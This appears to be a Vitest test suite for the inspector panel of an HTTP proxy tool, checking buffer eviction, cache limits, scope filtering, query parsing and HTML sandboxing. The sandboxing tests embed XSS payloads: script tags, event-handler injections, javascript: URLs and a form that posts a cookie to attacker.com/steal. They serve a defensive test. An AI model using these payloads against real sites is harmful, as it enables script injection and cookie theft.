import { describe, it, expect, beforeEach, vi } from 'vitest';
import { render, screen, act } from '@testing-library/react';
import { TransactionInspectorPanel } from '../../src/components/traffic/TransactionInspectorPanel';
import { useTrafficStore } from '../../src/stores/trafficStore';
import { useInspectorStore } from '../../src/stores/inspectorStore';
import { TrafficSummary, TransactionDetails, RawBlobResult } from '../../src/types/traffic';
import { parseHttpql, evaluateHttpql, validateHttpql, compileHttpqlToSql, getHttpqlSuggestions } from '../../src/utils/httpql';
import { ipcClient } from '../../src/ipc/client';

describe('Empirical Challenger UI-3: Memory Bounds, XSS Sandboxing & Security Invariants', () => {
  beforeEach(async () => {
    await useTrafficStore.getState().clearTraffic();
    useTrafficStore.getState().resetFilters();
    useTrafficStore.setState({ maxRingBufferSize: 50000 });
    useInspectorStore.getState().clearCache();
    useInspectorStore.setState({
      activeTab: 'response',
      requestSubView: 'parsed',
      responseSubView: 'parsed',
    });
  });

  const generateDummyTx = (
    idNum: number,
    overrides?: Partial<TrafficSummary>
  ): TrafficSummary => ({
    id: `tx-${idNum.toString().padStart(6, '0')}`,
    seqNumber: idNum,
    timestamp: '12:00:00',
    timestampMs: 1720000000000 + idNum * 100,
    method: idNum % 3 === 0 ? 'POST' : idNum % 5 === 0 ? 'DELETE' : 'GET',
    url: `https://target.local/api/resource/${idNum}`,
    host: 'target.local',
    path: `/api/resource/${idNum}`,
    status: idNum % 7 === 0 ? 500 : idNum % 4 === 0 ? 404 : 200,
    durationMs: 10 + (idNum % 200),
    sizeBytes: 256 + (idNum % 4096),
    inScope: idNum % 2 === 0,
    mimeType: idNum % 2 === 0 ? 'application/json' : 'text/html',
    tags: idNum % 2 === 0 ? ['scope:target'] : ['scope:out-of-scope'],
    tlsVersion: 'TLSv1.3',
    cipherSuite: 'TLS_AES_256_GCM_SHA384',
    reqBlobId: `blob-req-${idNum}`,
    resBlobId: `blob-res-${idNum}`,
    ...overrides,
  });

  const createDummyDetails = (id: string, bodyText = ''): TransactionDetails => ({
    id,
    timestamp: '2026-08-17T12:00:00Z',
    timingMs: 45,
    provenance: 'Proxy',
    request: {
      id: `req-${id}`,
      method: 'GET',
      url: `https://target.local/api/resource/${id}`,
      protocol: 'HTTP/1.1',
      headers: [{ name: 'Host', value: 'target.local' }],
      inScope: true,
    },
    response: {
      id: `res-${id}`,
      statusCode: 200,
      statusText: 'OK',
      headers: [{ name: 'Content-Type', value: 'text/html; charset=utf-8' }],
      bodyText: bodyText || JSON.stringify({ item: id }),
      durationMs: 40,
      tlsVersion: 'TLSv1.3',
      cipherSuite: 'TLS_AES_256_GCM_SHA384',
    },
  });

  // =========================================================================
  // 1. MEMORY BOUNDS & RING BUFFER FIFO EVICTION INVARIANTS
  // =========================================================================
  describe('1. Memory Bounds & High-Scale FIFO Buffer Eviction', () => {
    it('strictly enforces maxRingBufferSize (50,000 items) and evicts oldest items in FIFO order under 100,000 ingestion burst', () => {
      const bufferLimit = 50000;
      useTrafficStore.setState({ maxRingBufferSize: bufferLimit });

      const totalItems = 100000;
      const batchChunk = 20000;

      for (let chunk = 0; chunk < totalItems; chunk += batchChunk) {
        const batch: TrafficSummary[] = [];
        for (let i = chunk + 1; i <= chunk + batchChunk; i++) {
          batch.push(generateDummyTx(i));
        }
        useTrafficStore.getState().ingestBatch(batch);
      }

      const state = useTrafficStore.getState();

      // Invariant 1: Array length NEVER exceeds maxRingBufferSize
      expect(state.transactions.length).toBe(bufferLimit);

      // Invariant 2: Map size NEVER exceeds maxRingBufferSize
      expect(state.transactionMap.size).toBe(bufferLimit);

      // Invariant 3: Total captured count tracks all 100,000 items
      expect(state.totalCapturedCount).toBe(totalItems);

      // Invariant 4: Oldest items (1 to 50,000) are strictly evicted
      expect(state.transactions[0].id).toBe('tx-050001');
      expect(state.transactions[bufferLimit - 1].id).toBe('tx-100000');
      expect(state.transactionMap.has('tx-000001')).toBe(false);
      expect(state.transactionMap.has('tx-050000')).toBe(false);
      expect(state.transactionMap.has('tx-050001')).toBe(true);
      expect(state.transactionMap.has('tx-100000')).toBe(true);
    });

    it('strictly evicts oldest single items when using addTransaction at capacity limit', () => {
      useTrafficStore.setState({ maxRingBufferSize: 5 });

      // Ingest initial 5 items
      for (let i = 1; i <= 5; i++) {
        useTrafficStore.getState().addTransaction(generateDummyTx(i));
      }
      expect(useTrafficStore.getState().transactions.length).toBe(5);
      expect(useTrafficStore.getState().transactions[0].id).toBe('tx-000001');

      // Add 6th item -> should evict tx-000001
      useTrafficStore.getState().addTransaction(generateDummyTx(6));
      let state = useTrafficStore.getState();
      expect(state.transactions.length).toBe(5);
      expect(state.transactions[0].id).toBe('tx-000002');
      expect(state.transactions[4].id).toBe('tx-000006');
      expect(state.transactionMap.has('tx-000001')).toBe(false);
      expect(state.transactionMap.has('tx-000006')).toBe(true);

      // Add 7th item -> should evict tx-000002
      useTrafficStore.getState().addTransaction(generateDummyTx(7));
      state = useTrafficStore.getState();
      expect(state.transactions.length).toBe(5);
      expect(state.transactions[0].id).toBe('tx-000003');
      expect(state.transactions[4].id).toBe('tx-000007');
      expect(state.transactionMap.has('tx-000002')).toBe(false);
    });

    it('strictly bounds detailsCache in inspectorStore to MAX_DETAILS_CACHE_SIZE (50 items) with genuine LRU semantics', async () => {
      // Mock IPC details loader
      vi.spyOn(ipcClient, 'getTransactionDetails').mockImplementation(async (id: string) => {
        return createDummyDetails(id);
      });

      const store = useInspectorStore.getState();

      // Load 50 details
      for (let i = 1; i <= 50; i++) {
        await store.loadTransactionDetails(`tx-${i.toString().padStart(6, '0')}`);
      }
      expect(useInspectorStore.getState().detailsCache.size).toBe(50);
      expect(useInspectorStore.getState().detailsCache.has('tx-000001')).toBe(true);

      // Access tx-000001 to refresh its LRU position
      await store.loadTransactionDetails('tx-000001');

      // Now add 51st item (tx-000051)
      await store.loadTransactionDetails('tx-000051');

      const updatedCache = useInspectorStore.getState().detailsCache;
      // Invariant: Details cache size is capped at 50
      expect(updatedCache.size).toBe(50);

      // Invariant: tx-000001 was refreshed, so tx-000002 was evicted instead!
      expect(updatedCache.has('tx-000001')).toBe(true);
      expect(updatedCache.has('tx-000002')).toBe(false);
      expect(updatedCache.has('tx-000051')).toBe(true);
    });

    it('strictly bounds rawBlobCache in inspectorStore to MAX_RAW_BLOB_CACHE_SIZE (20 items)', async () => {
      vi.spyOn(ipcClient, 'getRawBlob').mockImplementation(async (blobId: string): Promise<RawBlobResult> => {
        return {
          blobId,
          sha256Hex: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
          sizeBytes: 32,
          dataBase64: btoa(`Raw content for ${blobId}`),
          isTruncated: false,
          mimeType: 'application/octet-stream',
        };
      });

      const store = useInspectorStore.getState();

      // Load 25 raw blobs
      for (let i = 1; i <= 25; i++) {
        await store.loadRawBlob(`blob-${i}`);
      }

      const updatedBlobCache = useInspectorStore.getState().rawBlobCache;
      // Invariant: Raw blob cache size is strictly capped at 20
      expect(updatedBlobCache.size).toBe(20);

      // Oldest blobs (1 to 5) should be evicted
      expect(updatedBlobCache.has('blob-1')).toBe(false);
      expect(updatedBlobCache.has('blob-5')).toBe(false);
      expect(updatedBlobCache.has('blob-6')).toBe(true);
      expect(updatedBlobCache.has('blob-25')).toBe(true);
    });
  });

  // =========================================================================
  // 2. XSS & HTML ISOLATION (SEC-11) INVARIANTS
  // =========================================================================
  describe('2. XSS & HTML Isolation (SEC-11)', () => {
    it('isolates hostile HTML responses inside an iframe without allow-scripts or dangerous capabilities', () => {
      const hostilePayload = `
        <!DOCTYPE html>
        <html>
        <head>
          <script>
            window.__hostile_xss_executed = true;
            window.parent.postMessage({ type: 'PWNED' }, '*');
          </script>
        </head>
        <body>
          <h1 id="injected-title">Security Exploit Attempt</h1>
          <img src="invalid-url.jpg" onerror="window.__hostile_img_xss=true; alert('XSS_IMG');" />
          <iframe src="javascript:window.__hostile_nested_iframe=true;"></iframe>
          <svg onload="window.__hostile_svg_xss=true;"></svg>
          <a href="javascript:alert('CLICK_XSS')" id="malicious-link">Malicious Link</a>
          <form action="http://attacker.com/steal" method="POST">
            <input name="cookie" value="secret" />
          </form>
        </body>
        </html>
      `;

      const hostileTx = generateDummyTx(999, {
        method: 'GET',
        url: 'https://target.local/vulnerable-endpoint',
        mimeType: 'text/html',
      });

      // Inject custom hostile response details into inspector store
      useInspectorStore.setState({
        activeTab: 'response',
        responseSubView: 'preview',
        activeDetails: createDummyDetails(hostileTx.id, hostilePayload),
      });

      const { container } = render(
        <TransactionInspectorPanel
          transaction={hostileTx}
        />
      );

      // Verify HTML preview iframe exists
      const iframe = container.querySelector('iframe[title="Response HTML Preview"]');
      expect(iframe).not.toBeNull();

      // SEC-11 Invariant: sandbox attribute MUST be present
      const sandboxAttr = iframe?.getAttribute('sandbox');
      expect(sandboxAttr).toBeDefined();

      // SEC-11 Invariant: sandbox MUST NOT allow scripts or popups or modals or forms or top navigation
      expect(sandboxAttr).not.toContain('allow-scripts');
      expect(sandboxAttr).not.toContain('allow-popups');
      expect(sandboxAttr).not.toContain('allow-modals');
      expect(sandboxAttr).not.toContain('allow-forms');
      expect(sandboxAttr).not.toContain('allow-top-navigation');

      // SEC-11 Invariant: Hostile payload MUST be quarantined inside srcDoc, NOT injected into host DOM
      expect(iframe?.getAttribute('srcDoc')).toContain('Security Exploit Attempt');

      // Host DOM must NOT have any injected script tags from the payload
      const hostScripts = container.querySelectorAll('script');
      expect(hostScripts.length).toBe(0);

      // Global window must NOT have been contaminated
      expect((window as any).__hostile_xss_executed).toBeUndefined();
      expect((window as any).__hostile_img_xss).toBeUndefined();
      expect((window as any).__hostile_nested_iframe).toBeUndefined();
      expect((window as any).__hostile_svg_xss).toBeUndefined();
    });

    it('safely renders hostile text across all non-preview inspector subviews (Raw, Parsed, Hex, Tree) without HTML execution', () => {
      const hostilePayload = `<script>alert('XSS')</script><b>Bold Content</b>`;
      const hostileTx = generateDummyTx(888);

      const hostileDetails = createDummyDetails(hostileTx.id, hostilePayload);
      hostileDetails.request.headers = [{ name: 'X-Injected-Header', value: hostilePayload }];
      hostileDetails.request.bodyText = hostilePayload;

      useInspectorStore.setState({
        activeDetails: hostileDetails,
      });

      useInspectorStore.setState({ activeTab: 'response', responseSubView: 'parsed' });
      const { rerender } = render(<TransactionInspectorPanel transaction={hostileTx} />);
      expect(screen.getAllByText((content) => content.includes(hostilePayload)).length).toBeGreaterThan(0);

      // 2. Raw view: renders as plain formatted HTTP text
      act(() => {
        useInspectorStore.setState({ responseSubView: 'raw' });
      });
      rerender(<TransactionInspectorPanel transaction={hostileTx} />);
      expect(screen.getAllByText((content) => content.includes(hostilePayload)).length).toBeGreaterThan(0);

      // 3. Hex view: renders byte hex codes
      act(() => {
        useInspectorStore.setState({ responseSubView: 'hex' });
      });
      rerender(<TransactionInspectorPanel transaction={hostileTx} />);
      expect(screen.getByText('Decoded ASCII')).toBeInTheDocument();
    });
  });

  // =========================================================================
  // 3. SCOPE & CAS CRYPTOGRAPHIC INTEGRITY (SEC-01, SEC-07)
  // =========================================================================
  describe('3. Scope & CAS Cryptographic Integrity (SEC-01, SEC-07)', () => {
    it('SEC-01: Scope Only toggle strictly excludes all out-of-scope traffic across 1,000 mixed transactions', () => {
      const store = useTrafficStore.getState();
      const mixedBatch: TrafficSummary[] = [];

      for (let i = 1; i <= 1000; i++) {
        // Even indices: in-scope, Odd indices: out-of-scope
        mixedBatch.push(
          generateDummyTx(i, {
            inScope: i % 2 === 0,
            tags: i % 2 === 0 ? ['scope:target'] : ['scope:out-of-scope'],
          })
        );
      }

      store.ingestBatch(mixedBatch);
      expect(useTrafficStore.getState().transactions.length).toBe(1000);

      // Initially all 1000 indices are visible
      expect(useTrafficStore.getState().filteredIndices).toBeNull();

      // Activate Scope Only filter (SEC-01)
      store.setScopeOnly(true);
      const state = useTrafficStore.getState();
      expect(state.filterScopeOnly).toBe(true);
      expect(state.filteredIndices).not.toBeNull();
      expect(state.filteredIndices?.length).toBe(500);

      // Invariant: EVERY filtered transaction MUST have inScope === true
      const allInScope = state.filteredIndices!.every((idx) => {
        return state.transactions[idx].inScope === true;
      });
      expect(allInScope).toBe(true);

      // Deactivate Scope Only filter
      store.setScopeOnly(false);
      expect(useTrafficStore.getState().filteredIndices).toBeNull();
    });

    it('SEC-01: Scope Audit tab accurately displays IN-SCOPE ALLOW vs OUT-OF-SCOPE DENY proofs', () => {
      const inScopeTx = generateDummyTx(10, { inScope: true });
      const outOfScopeTx = generateDummyTx(11, { inScope: false });

      useInspectorStore.setState({ activeTab: 'scope' });

      // Test In-Scope transaction
      const { rerender } = render(<TransactionInspectorPanel transaction={inScopeTx} />);
      expect(screen.getByText(/VERDICT: IN-SCOPE ALLOW/i)).toBeInTheDocument();
      expect(screen.getByText(/Pre-Socket Evaluation Engine \(SEC-01 Provenance Audit\)/i)).toBeInTheDocument();
      expect(screen.getByText(/SSRF Protection Check/i)).toBeInTheDocument();
      expect(screen.getByText(/Target Domain Match/i)).toBeInTheDocument();

      // Test Out-of-Scope transaction
      rerender(<TransactionInspectorPanel transaction={outOfScopeTx} />);
      expect(screen.getByText(/VERDICT: OUT-OF-SCOPE DENY/i)).toBeInTheDocument();
    });

    it('SEC-07: CAS Evidence tab exposes cryptographically verifiable SHA-256 hashes and tamper proofs', () => {
      const sampleTx = generateDummyTx(42);
      useInspectorStore.setState({ activeTab: 'cas' });

      render(<TransactionInspectorPanel transaction={sampleTx} />);

      expect(screen.getByText('CAS Integrity Verified (SEC-07)')).toBeInTheDocument();
      expect(screen.getByText(/Raw byte buffers are stored with immutable SHA-256/i)).toBeInTheDocument();

      // Verify SHA-256 hash formatting (64 hex characters preceded by sha256:)
      const reqHash = screen.getByText(/sha256:7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069/i);
      expect(reqHash).toBeInTheDocument();

      const resHash = screen.getByText(/sha256:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08/i);
      expect(resHash).toBeInTheDocument();

      // Verify Tamper Verification Proof indicator
      expect(screen.getByText('VALID (Zero divergence)')).toBeInTheDocument();
      expect(screen.getByText(/SQLite WAL \+ Local Encrypted CAS Store/i)).toBeInTheDocument();
    });
  });

  // =========================================================================
  // 4. HTTPQL ADVANCED PRECEDENCE & SQL COMPILATION INVARIANTS
  // =========================================================================
  describe('4. HTTPQL Advanced Precedence & SQL Compilation Invariants', () => {
    it('correctly parses and evaluates complex nested boolean precedence (NOT > AND > OR)', () => {
      const tx1 = generateDummyTx(1, { method: 'GET', status: 200, inScope: true });
      const tx2 = generateDummyTx(2, { method: 'POST', status: 500, inScope: false });
      const tx3 = generateDummyTx(3, { method: 'DELETE', status: 404, inScope: true });

      // Query: req.method == "GET" or req.method == "POST" and res.status == 500
      // Due to AND having higher precedence than OR:
      // Evaluates as: req.method == "GET" OR (req.method == "POST" AND res.status == 500)
      const q1 = 'req.method == "GET" or req.method == "POST" and res.status == 500';
      const { ast: ast1 } = parseHttpql(q1);

      expect(evaluateHttpql(ast1, tx1)).toBe(true);  // req.method == 'GET' is true
      expect(evaluateHttpql(ast1, tx2)).toBe(true);  // POST and 500 is true
      expect(evaluateHttpql(ast1, tx3)).toBe(false); // Neither matches

      // Explicit grouping with parentheses: (req.method == "GET" or req.method == "POST") and res.status == 500
      const q2 = '(req.method == "GET" or req.method == "POST") and res.status == 500';
      const { ast: ast2 } = parseHttpql(q2);

      expect(evaluateHttpql(ast2, tx1)).toBe(false); // Status is 200, not 500
      expect(evaluateHttpql(ast2, tx2)).toBe(true);  // POST and 500 matches
      expect(evaluateHttpql(ast2, tx3)).toBe(false);
    });

    it('safely compiles valid HTTPQL queries to sanitized SQLite WHERE clauses with parameterized protection', () => {
      const query = 'req.method == "POST" and res.status >= 400 and tx.in_scope == true';
      const { ast } = parseHttpql(query);
      const sql = compileHttpqlToSql(ast);

      expect(sql).toContain("req_method = 'POST'");
      expect(sql).toContain('res_status >= 400');
      expect(sql).toContain("in_scope = 'true'");
      expect(sql).toContain(' AND ');
    });

    it('gracefully handles adversarial malformed queries with structured syntax errors without crashing', () => {
      const brokenQueries = [
        'req.method == ',
        '== "GET"',
        'and or not',
        'req.path == "unclosed',
      ];

      for (const bq of brokenQueries) {
        const val = validateHttpql(bq);
        // Invariant: Must report valid: false and provide structured error message without throwing
        expect(val.valid).toBe(false);
        expect(val.error).toBeDefined();
        expect(typeof val.error?.message).toBe('string');
      }
    });

    it('supports bare string search fallback gracefully when no operator is provided', () => {
      const val = validateHttpql('login');
      expect(val.valid).toBe(true);
      expect(val.compiledSqlWhere).toContain("req_uri LIKE '%login%'");
    });

    it('provides context-aware autocomplete suggestions for fields, operators, and values', () => {
      // 1. Partial field
      const fieldSuggestions = getHttpqlSuggestions('req.', 4);
      expect(fieldSuggestions.length).toBeGreaterThan(0);
      expect(fieldSuggestions.some((s) => s.label.includes('req.method'))).toBe(true);

      // 2. Operator suggestion after field
      const opSuggestions = getHttpqlSuggestions('req.method ', 11);
      expect(opSuggestions.some((s) => s.label === '==')).toBe(true);

      // 3. Value suggestions after method operator
      const valSuggestions = getHttpqlSuggestions('req.method == ', 14);
      expect(valSuggestions.some((s) => s.label === '"GET"')).toBe(true);
      expect(valSuggestions.some((s) => s.label === '"POST"')).toBe(true);
    });
  });
});
